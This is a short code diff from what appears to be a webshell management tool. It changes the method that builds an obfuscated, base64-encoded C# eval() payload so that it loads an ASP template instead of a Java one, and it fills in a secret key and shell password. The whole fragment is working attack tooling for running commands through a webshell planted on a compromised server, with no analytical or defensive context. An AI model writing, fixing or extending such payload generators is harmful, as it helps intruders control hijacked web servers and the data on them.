@@ -77,7 +77,7 @@ public class CSharpEvalAesBase64 implements Cryption {
     }
 
     public String generateEvalContent() {
-        return URLEncoder.encode(String.format("eval(System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(HttpUtility.UrlDecode('%s'))),'unsafe');", URLEncoder.encode(functions.base64Encode(new String(functions.readInputStreamAutoClose(CSharpEvalAesBase64.class.getClassLoader().getResourceAsStream("shell/java/template/eval.bin"))).replace("{secretKey}", this.key).replace("{pass}", this.shell.getSecretKey()).getBytes()))));
+        return URLEncoder.encode(String.format("eval(System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(HttpUtility.UrlDecode('%s'))),'unsafe');", URLEncoder.encode(functions.base64Encode(new String(functions.readInputStreamAutoClose(CSharpEvalAesBase64.class.getClassLoader().getResourceAsStream("shell/asp/template/eval.bin"))).replace("{secretKey}", this.key).replace("{pass}", this.shell.getSecretKey()).getBytes()))));
     }
 
     @Override 
